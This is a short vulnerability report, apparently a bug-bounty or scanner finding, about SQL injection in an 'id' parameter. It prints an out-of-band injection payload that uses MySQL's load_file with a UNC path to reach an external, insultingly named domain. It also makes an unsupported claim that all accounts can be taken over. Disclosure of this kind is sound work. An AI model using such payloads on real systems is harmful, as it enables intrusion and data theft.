## Description:
The id parameter appears to be vulnerable to SQL injection attacks. The payload '+(select load_file('\\\\2bej8mzxoxsqpel4hbll4ar23t9mxjlaoyfl69v.http://stupid_asshole.com\\foh'))+' was submitted in the id parameter. 
This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. 
The application interacted with that domain, indicating that the injected SQL query was executed.
The attacker from outside can take control of all accounts of this system by using this vulnerability!
WARNING: If this is in some external domain, or some subdomain, or internal, this will be extremely dangerous!
Status: CRITICAL
